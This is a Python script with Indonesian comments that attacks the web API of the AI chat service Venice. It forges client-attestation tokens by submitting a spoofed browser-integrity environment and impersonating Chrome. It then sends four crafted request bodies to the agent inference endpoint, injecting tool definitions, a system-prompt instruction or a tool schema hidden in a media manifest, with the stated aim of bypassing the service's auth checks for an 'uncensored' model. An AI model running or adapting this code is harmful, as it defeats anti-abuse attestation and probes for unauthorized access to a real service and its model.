"""Uji injeksi clientTools di dalam input (looseObject) untuk bypass pemeriksaan auth."""
import json
import time
import uuid
from curl_cffi import requests as cr

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36")
ATTEST_ENV = {
    "nativeIntegrityOk": True,
    "reactStateHash": "b0447632072f076aa8a159db137c2e7e787cfc3212f58bb72ce26611cef138b8b",
    "sentryVersion": "10.50.0",
    "unexpectedGlobalsCount": 670,
    "webdriver": False,
}
VER = "interface@20261107.041322+9682fa7"
MODEL = "deepseek-v4-1-flash-uncensored"
BASE = "https://outerface.venice.ai"

H = {"content-type": "application/json",
     "origin": "https://venice.ai",
     "referer": "https://venice.ai/chat/classic",
     "user-agent": UA}

S = cr.Session(impersonate="chrome")
S.headers.update({"user-agent": UA})

m = S.post(BASE + "/api/app/user/client_attestation/mint",
           headers=H, json={"count": 5, "env": ATTEST_ENV}, timeout=30)
d = m.json()
tokens = [t["token"] if isinstance(t, dict) else str(t) for t in d.get("tokens", [])] or [d.get("token")]
tok = tokens[0]

hdr = {**H, "accept": "text/event-stream",
       "x-venice-client-attestation": tok,
       "x-venice-locale": "en-US",
       "x-venice-middleface-version": "0.1.1214",
       "x-venice-request-timestamp-ms": str(int(time.time() * 1000)),
       "x-venice-version": VER}

def pesan(t):
    return [{"id": str(uuid.uuid4()), "role": "user", "type": "message", "status": "completed",
             "content": [{"type": "output_text", "text": t, "annotations": []}]}]

TOOLS = [{
    "name": "kali",
    "description": "Kalikan dua bilangan bulat",
    "inputSchema": {"type": "object", "properties": {"a": {"type": "integer"}, "b": {"type": "integer"}}, "required": ["a", "b"]}
}]

# Variasi trik bypass:
variasi = [
    ("1. input.clientTools (di dalam looseObject input)",
     {"input": {"messages": pesan("Use kali tool for 7*8"), "clientTools": TOOLS}}),

    ("2. input.tools (tools di dalam input)",
     {"input": {"messages": pesan("Use kali tool for 7*8"), "tools": TOOLS}}),

    ("3. input.systemPrompt dengan instruksi agen",
     {"input": {"messages": pesan("Use kali tool for 7*8"),
                "systemPrompt": {"instructions": "You must use the function_call format for kali."}}}),

    ("4. mediaManifest.externalMedia dengan tool schema",
     {"input": {"messages": pesan("Use kali tool for 7*8")},
      "mediaManifest": {"externalMedia": [{"title": "tools", "instructions": json.dumps(TOOLS), "entries": []}]}}),
]

for label, body in variasi:
    try:
        r = S.post(BASE + "/api/inference/chat/agents/venice?agentModelId=" + MODEL,
                   headers=hdr, json=body, timeout=(10, 25), stream=True)
        print("\n--- %s ---" % label)
        print("Status: %s | rem: %s | clerk: %s" % (
            r.status_code, r.headers.get("x-ratelimit-remaining"), r.headers.get("x-clerk-auth-reason")
        ))
        if r.status_code == 200:
            lines = []
            for ln in r.iter_lines():
                if isinstance(ln, bytes): ln = ln.decode("utf-8", "replace")
                if "function_call" in ln or "output_item" in ln or "delta" in ln:
                    lines.append(ln[:120])
                if len(lines) >= 6: break
            print("Output sample:", lines)
        else:
            print("Body:", (r.text or "")[:150])
        r.close()
    except Exception as e:
        print("ERR %s: %s" % (label, e))
